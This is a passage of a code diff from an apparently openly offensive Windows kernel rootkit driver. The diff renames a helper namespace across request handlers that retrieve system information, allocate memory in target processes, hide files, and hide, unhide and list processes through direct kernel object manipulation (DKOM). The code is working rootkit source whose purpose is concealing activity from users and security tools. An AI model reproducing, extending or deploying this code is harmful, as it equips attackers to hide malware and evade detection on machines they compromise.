 	// Check for KM address (not allowed for this function):
 	if ((ULONG64)RootkInst->Buffer >= memory_helpers::GetHighestUserModeAddrADD()) {
 		DbgPrintEx(0, 0, "KMDFdriver Requests - Get system information failed (attribute buffer is in systemspace; %p)\n", RootkInst->Buffer);
-		return general_helpers::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_SYSTEMSPC, STATUS_UNSUCCESSFUL, RootkInst);
+		return requests_helpers::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_SYSTEMSPC, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 
@@ -555,7 +555,7 @@ NTSTATUS RetrieveSystemInformationRK(ROOTKIT_MEMORY* RootkInst) {
 	LocalSysinf = ExAllocatePoolWithTag(NonPagedPool, InfoSize, 'RqSi');
 	if (!LocalSysinf) {
 		DbgPrintEx(0, 0, "KMDFdriver Requests - Get system information failed (cannot allocate memory for local information buffer)\n");
-		return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_MEMALLOC, STATUS_UNSUCCESSFUL, RootkInst);
+		return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_MEMALLOC, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 
@@ -565,7 +565,7 @@ NTSTATUS RetrieveSystemInformationRK(ROOTKIT_MEMORY* RootkInst) {
 	if (PrcInf == NULL) {
 		DbgPrintEx(0, 0, "KMDFdriver Requests - Get system information failed (cannot allocate memory for information in medium process)\n");
 		ExFreePool(LocalSysinf);
-		return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_MEMALLOC, STATUS_UNSUCCESSFUL, RootkInst);
+		return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_MEMALLOC, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 
@@ -594,12 +594,12 @@ NTSTATUS RetrieveSystemInformationRK(ROOTKIT_MEMORY* RootkInst) {
 
 	if (!NT_SUCCESS(Status)) {
 		DbgPrintEx(0, 0, "KMDFdriver Requests - Get system information failed (failed to copy actual information buffer into medium process)\n");
-		return general_helpers::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_COPYFAIL, STATUS_SUCCESS, RootkInst);
+		return requests_helpers::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_COPYFAIL, STATUS_SUCCESS, RootkInst);
 	}
 	DbgPrintEx(0, 0, "KMDFdriver Requests - Get system information succeeded\n");
 	RootkInst->Out = PrcInf;
 	RootkInst->Size = InfoSize;
-	return general_helpers::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInst);
+	return requests_helpers::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInst);
 }
 
 
@@ -619,21 +619,21 @@ NTSTATUS AllocSpecificMemoryRK(ROOTKIT_MEMORY* RootkInst) {
 	// Check for invalid arguments:
 	if (InitialAddress == NULL || RequestedSize == NULL) {
 		DbgPrintEx(0, 0, "KMDFdriver Requests - Allocate memory in process failed (one or more invalid parameters: %p, %zu)\n", InitialAddress, RequestedSize);
-		return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_ADRBUFSIZE, STATUS_UNSUCCESSFUL, RootkInst);
+		return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_ADRBUFSIZE, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 
 	// Check for KM address (not allowed for this function):
 	if ((ULONG64)InitialAddress >= memory_helpers::GetHighestUserModeAddrADD()) {
 		DbgPrintEx(0, 0, "KMDFdriver Requests - Allocate memory in process failed (the allocation address %p is in systemspace)\n", InitialAddress);
-		return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SYSTEMSPC, STATUS_UNSUCCESSFUL, RootkInst);
+		return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SYSTEMSPC, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 
 	// Process EPROCESS:
 	if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)RootkInst->MainPID, &Process))) {
 		DbgPrintEx(0, 0, "KMDFdriver Requests - Allocate memory in process failed (cannot get EPROCESS of process %llu)\n", RootkInst->MainPID);
-		return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_PROCHANDLE, STATUS_UNSUCCESSFUL, RootkInst);
+		return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_PROCHANDLE, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 
@@ -642,10 +642,10 @@ NTSTATUS AllocSpecificMemoryRK(ROOTKIT_MEMORY* RootkInst) {
 	RootkInst->Out = memory_helpers::AllocateMemoryADD(InitialAddress, AllocSize, &PrcState, ZeroBits);
 	if (RootkInst->Out == NULL) {
 		DbgPrintEx(0, 0, "KMDFdriver Requests - Allocate memory in process failed (actual allocation of memory failed)\n");
-		return general_helpers::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_MEMALLOC, STATUS_UNSUCCESSFUL, RootkInst);
+		return requests_helpers::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_MEMALLOC, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 	DbgPrintEx(0, 0, "KMDFdriver Requests - Allocate memory in process succeeded (memory base alligned from %p to %p)\n", RootkInst->Out, InitialAddress);
-	return general_helpers::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInst);
+	return requests_helpers::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInst);
 }
 
 
@@ -664,7 +664,7 @@ NTSTATUS HideFileObjectRK(ROOTKIT_MEMORY* RootkInst) {
 	if ((ULONG64)RootkInst->Reserved == SHOW_HIDDEN || (ULONG64)RootkInst->Reserved == HIDE_FILE) {
 		if ((RootkInst->Out == NULL && (ULONG64)RootkInst->Reserved == HIDE_FILE) || RootkInst->Buffer == NULL || (RootkInst->MedPID == 0 && RootkInst->MainPID == 0) || RootkInst->Size == 0) {
 			DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object failed (one or more invalid parameters: %p, %p, %llu, %llu, %llu)\n", RootkInst->Out, RootkInst->Buffer, RootkInst->MedPID, RootkInst->MainPID, RootkInst->Size);
-			return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_ADRBUFSIZE, STATUS_UNSUCCESSFUL, RootkInst);
+			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_ADRBUFSIZE, STATUS_UNSUCCESSFUL, RootkInst);
 		}
 	}
 
@@ -673,21 +673,21 @@ NTSTATUS HideFileObjectRK(ROOTKIT_MEMORY* RootkInst) {
 	if ((ULONG64)RootkInst->Reserved == HIDE_FILE) {
 		if ((ULONG64)RootkInst->Buffer >= memory_helpers::GetHighestUserModeAddrADD()) {
 			DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object failed (the source string address %p is in systemspace)\n", RootkInst->Buffer);
-			return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SYSTEMSPC, STATUS_UNSUCCESSFUL, RootkInst);
+			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SYSTEMSPC, STATUS_UNSUCCESSFUL, RootkInst);
 		}
 		//if ((ULONG64)RootkInst->Out < memory_helpers::GetHighestUserModeAddrADD()) {
 		//	DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object failed (the destination string address %p is in userspace)\n", RootkInst->Out);
-		//	return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SYSTEMSPC, STATUS_UNSUCCESSFUL, RootkInst);
+		//	return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SYSTEMSPC, STATUS_UNSUCCESSFUL, RootkInst);
 		//}
 	}
 	else if ((ULONG64)RootkInst->Reserved == SHOW_HIDDEN) {
 		//if ((ULONG64)RootkInst->Buffer < memory_helpers::GetHighestUserModeAddrADD()) {
 		//	DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object failed (the source list address %p is in userspace)\n", RootkInst->Buffer);
-		//	return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SYSTEMSPC, STATUS_UNSUCCESSFUL, RootkInst);
+		//	return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SYSTEMSPC, STATUS_UNSUCCESSFUL, RootkInst);
 		//}
 		if ((ULONG64)RootkInst->Out >= memory_helpers::GetHighestUserModeAddrADD()) {
 			DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object failed (the destination list address %p is in systemspace)\n", RootkInst->Out);
-			return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SYSTEMSPC, STATUS_UNSUCCESSFUL, RootkInst);
+			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SYSTEMSPC, STATUS_UNSUCCESSFUL, RootkInst);
 		}
 	}
 
@@ -697,13 +697,13 @@ NTSTATUS HideFileObjectRK(ROOTKIT_MEMORY* RootkInst) {
 		if (RootkInst->MainPID != 0) {
 			if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)RootkInst->MainPID, &Process))) {
 				DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object failed (cannot get EPROCESS of process %llu, main)\n", RootkInst->MainPID);
-				return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_PROCHANDLE, STATUS_UNSUCCESSFUL, RootkInst);
+				return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_PROCHANDLE, STATUS_UNSUCCESSFUL, RootkInst);
 			}
 		}
 		else {
 			if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)RootkInst->MedPID, &Process))) {
 				DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object failed (cannot get EPROCESS of process %llu, medium specific)\n", RootkInst->MedPID);
-				return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_PROCHANDLE, STATUS_UNSUCCESSFUL, RootkInst);
+				return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_PROCHANDLE, STATUS_UNSUCCESSFUL, RootkInst);
 			}
 		}
 	}
@@ -716,7 +716,7 @@ NTSTATUS HideFileObjectRK(ROOTKIT_MEMORY* RootkInst) {
 		Status = UserToKernelMEM(Process, RootkInst->Buffer, RootkInst->Out, RootkInst->Size, FALSE);
 		if (!NT_SUCCESS(Status)) {
 			DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object failed (UserToKernelMEM() of string failed: %p, %p, %zu)\n", RootkInst->Buffer, RootkInst->Out, RootkInst->Size);
-			return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, STATUS_UNSUCCESSFUL, RootkInst);
+			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, STATUS_UNSUCCESSFUL, RootkInst);
 		}
 		return HIDE_TEMPSUC;
 	case SHOW_HIDDEN:
@@ -727,14 +727,14 @@ NTSTATUS HideFileObjectRK(ROOTKIT_MEMORY* RootkInst) {
 		ListOutput = memory_helpers::AllocateMemoryADD(ListOutput, ListSize, &PrcState, 0);
 		if (ListOutput == NULL) {
 			DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object failed (Allocation of memory for list in medium failed: %p, %llu)\n", ListOutput, ListSize);
-			return general_helpers::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_MEMALLOC, STATUS_UNSUCCESSFUL, RootkInst);
+			return requests_helpers::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_MEMALLOC, STATUS_UNSUCCESSFUL, RootkInst);
 		}
 		RootkInst->Out = ListOutput;
 		RootkInst->Size = ListSize;
 		Status = KernelToUserMEM(Process, RootkInst->Buffer, RootkInst->Out, RootkInst->Size, FALSE);
 		if (!NT_SUCCESS(Status)) {
 			DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object failed (KernelToUserMEM() of string failed: %p, %p, %zu)\n", RootkInst->Out, RootkInst->Buffer, RootkInst->Size);
-			return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, STATUS_UNSUCCESSFUL, RootkInst);
+			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, STATUS_UNSUCCESSFUL, RootkInst);
 		}
 		return SHOWHIDDEN_TEMPSUC;
 	default:
@@ -760,7 +760,7 @@ NTSTATUS HideProcessRK(ROOTKIT_MEMORY* RootkInst) {
 	// Check for invalid arguments:
 	if ((RootkInst->MainPID == 0 && RootkInst->Size != 2) || !(RootkInst->Size == 0 || RootkInst->Size == 1 || RootkInst->Size == 2) || (RootkInst->Size == 2 && RootkInst->MedPID == 0) || (RootkInst->Size == 2 && RootkInst->Out == NULL)) {
 		DbgPrintEx(0, 0, "KMDFdriver Requests - Hide process via DKOM failed (invalid PID: %llu, %llu, %llu / invalid request number: %llu / invalid output buffer: %p)\n", RootkInst->MainPID, RootkInst->SemiPID, RootkInst->MedPID, RootkInst->Size, RootkInst->Out);
-		return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_ADRBUFSIZE, STATUS_UNSUCCESSFUL, RootkInst);
+		return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_ADRBUFSIZE, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 
@@ -769,11 +769,11 @@ NTSTATUS HideProcessRK(ROOTKIT_MEMORY* RootkInst) {
 		Status = process::HideProcess(RootkInst->MainPID, TRUE);
 		if (Status == STATUS_NOT_FOUND) {
 			DbgPrintEx(0, 0, "KMDFdriver Requests - Hide process via DKOM failed (did not find process with PID of %llu)\n", RootkInst->MainPID);
-			return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, STATUS_NOT_FOUND, RootkInst);
+			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, STATUS_NOT_FOUND, RootkInst);
 		}
 		else if (!NT_SUCCESS(Status)) {
 			DbgPrintEx(0, 0, "KMDFdriver Requests - Hide process via DKOM failed (hiding function with PID of %llu failed with status 0x%x)\n", RootkInst->MainPID, Status);
-			return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, Status, RootkInst);
+			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, Status, RootkInst);
 		}
 		DbgPrintEx(0, 0, "KMDFdriver Requests - Hide process via DKOM succeeded, hidden process with PID of %llu\n", RootkInst->MainPID);
 	}
@@ -786,36 +786,36 @@ NTSTATUS HideProcessRK(ROOTKIT_MEMORY* RootkInst) {
 		}
 		if (Status == STATUS_NOT_FOUND) {
 			DbgPrintEx(0, 0, "KMDFdriver Requests - Unhide process via DKOM failed (did not find process with PID of %llu)\n", RootkInst->MainPID);
-			return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, STATUS_NOT_FOUND, RootkInst);
+			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, STATUS_NOT_FOUND, RootkInst);
 		}
 		else if (!NT_SUCCESS(Status)) {
 			DbgPrintEx(0, 0, "KMDFdriver Requests - Unhide process via DKOM failed (unhiding function with PID of %llu failed with status 0x%x)\n", RootkInst->MainPID, Status);
-			return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, Status, RootkInst);
+			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, Status, RootkInst);
 		}
 		DbgPrintEx(0, 0, "KMDFdriver Requests - Unhide process via DKOM succeeded, hidden process with PID of %llu\n", RootkInst->MainPID);
 	}
 	else {
 		if ((ULONG64)RootkInst->Out >= memory_helpers::GetHighestUserModeAddrADD()) {
 			DbgPrintEx(0, 0, "KMDFdriver Requests - List hidden processes via DKOM failed (the destination list address %p is in systemspace)\n", RootkInst->Out);
-			return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SYSTEMSPC, STATUS_UNSUCCESSFUL, RootkInst);
+			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SYSTEMSPC, STATUS_UNSUCCESSFUL, RootkInst);
 		}
 		if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)RootkInst->MedPID, &MediumProcess))) {
 			DbgPrintEx(0, 0, "KMDFdriver Requests - List hidden processes via DKOM failed (cannot get EPROCESS of medium process with PID of %llu)\n", RootkInst->MedPID);
-			return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_PROCHANDLE, STATUS_UNSUCCESSFUL, RootkInst);
+			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_PROCHANDLE, STATUS_UNSUCCESSFUL, RootkInst);
 		}
 		if (!NT_SUCCESS(process::ListHiddenProcesses(&TempSize, &HiddenInput))) {
 			DbgPrintEx(0, 0, "KMDFdriver Requests - List hidden processes via DKOM failed (Error in ListHiddenProcesses())\n");
 			if (HiddenInput != NULL) {
 				ExFreePool(HiddenInput);
 			}
-			return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, STATUS_UNSUCCESSFUL, RootkInst);
+			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, STATUS_UNSUCCESSFUL, RootkInst);
 		}
 		if (TempSize == 0) {
 			DbgPrintEx(0, 0, "KMDFdriver Requests - List hidden processes via DKOM failed (Empty list, ListSize = 0)\n");
 			if (HiddenInput != NULL) {
 				ExFreePool(HiddenInput);
 			}
-			return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, STATUS_UNSUCCESSFUL, RootkInst);
+			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, STATUS_UNSUCCESSFUL, RootkInst);
 		}
 		TempOutput = RootkInst->Out;
 		KeStackAttachProcess(MediumProcess, &MediumState);
@@ -825,7 +825,7 @@ NTSTATUS HideProcessRK(ROOTKIT_MEMORY* RootkInst) {
 			if (HiddenInput != NULL) {
 				ExFreePool(HiddenInput);
 			}
-			return general_helpers::ExitRootkitRequestADD(NULL, MediumProcess, ROOTKSTATUS_MEMALLOC, STATUS_UNSUCCESSFUL, RootkInst);
+			return requests_helpers::ExitRootkitRequestADD(NULL, MediumProcess, ROOTKSTATUS_MEMALLOC, STATUS_UNSUCCESSFUL, RootkInst);
 		}
 		RootkInst->Out = TempOutput;
 		RootkInst->Size = TempSize;
@@ -835,12 +835,12 @@ NTSTATUS HideProcessRK(ROOTKIT_MEMORY* RootkInst) {
 			if (HiddenInput != NULL) {
 				ExFreePool(HiddenInput);
 			}
-			return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, STATUS_UNSUCCESSFUL, RootkInst);
+			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, STATUS_UNSUCCESSFUL, RootkInst);
 		}
 		if (HiddenInput != NULL) {
 			ExFreePool(HiddenInput);
 		}
 		DbgPrintEx(0, 0, "KMDFdriver Requests - List hidden processes via DKOM succeeded\n");
 	}
-	return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInst);
+	return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInst);
 }
